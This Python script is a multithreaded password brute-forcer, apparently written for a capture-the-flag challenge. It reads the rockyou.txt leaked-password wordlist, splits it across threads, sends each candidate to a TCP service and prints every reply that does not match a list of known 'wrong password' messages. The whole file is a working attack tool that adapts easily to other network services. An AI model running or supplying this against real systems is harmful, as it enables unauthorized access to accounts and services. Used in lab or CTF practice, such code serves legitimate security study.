import socket
from sys import argv
from threading import Thread
from typing import List

ignore = {
    b'',
    b'Enter password to unlock my secret\nPassword: ',
    b'Enter password to unlock my secret\nPassword: Validating...\n',
    b'Validating...\n',
    b"That doesn't look right, try again?",
    b"Validating...\nHmm. That doesn't look right, try again?",
    b"Hmm. That doesn't look right, try again?",
    b"Hmm.. That doesn't look right, try again?",
    b"Hmm... That doesn't look right, try again?",
    b"Hmm.... That doesn't look right, try again?",
    b"Enter password to unlock my secret\nPassword: Validating...\nHmm. That doesn't look right, try again?",
}


class BruteForce(Thread):
    def __init__(self, addr: str, port: int, passwords: List[bytes]):
        Thread.__init__(self)
        self.host = (addr, port)
        self.passwords = passwords

    def run(self):
        for password in self.passwords:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(self.host)

                s.sendall(password)

                data = b' '
                while data:
                    data = s.recv(1024)
                    if data not in ignore:
                        print(password)
                        print(data)

                s.close()

            except Exception as e:
                print(password)
                print(e)


def main(addr: str, port: str, n_threads: str):
    port = int(port)
    n_threads = int(n_threads)

    with open('rockyou.txt', 'rb') as file:
        passwords = file.readlines()

    threads = []

    for i in range(n_threads):
        t = BruteForce(addr, port, passwords[i::n_threads])
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


if __name__ == '__main__':
    main(*argv[1:])
